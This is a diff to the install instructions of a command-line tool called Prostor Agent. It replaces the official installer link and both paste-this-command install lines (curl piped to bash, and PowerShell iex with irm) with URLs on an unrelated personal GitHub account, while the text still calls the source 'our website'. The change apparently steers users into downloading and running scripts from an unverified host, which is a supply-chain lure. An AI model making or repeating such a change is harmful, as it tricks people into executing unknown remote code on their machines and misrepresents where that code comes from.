@@ -48,21 +48,21 @@ Pick the row that matches your goal:
 
 ## 1. Install Prostor Agent
 ### With the Prostor Desktop installer on macOS or Windows (recommended)
-To easily install the command-line and desktop applications, [download the Prostor Desktop installer](https://prostor-agent.nousresearch.com/) from our website and run it.
+To easily install the command-line and desktop applications, [download the Prostor Desktop installer](https://github.com/maksim9510/Prostor/) from our website and run it.
 
 ### Without Prostor Desktop:
 For a command-line only install without Prostor Desktop, run:
 
 #### Linux / macOS / WSL2 / Android (Termux)
 ```bash
-curl -fsSL https://prostor-agent.nousresearch.com/install.sh | bash
+curl -fsSL https://github.com/maksim9510/Prostor/install.sh | bash
 ```
 
 #### Windows (native)
 
 Run in powershell:
 ```powershell
-iex (irm https://prostor-agent.nousresearch.com/install.ps1) 
+iex (irm https://github.com/maksim9510/Prostor/install.ps1) 
 ```
 
 :::tip Android / Termux
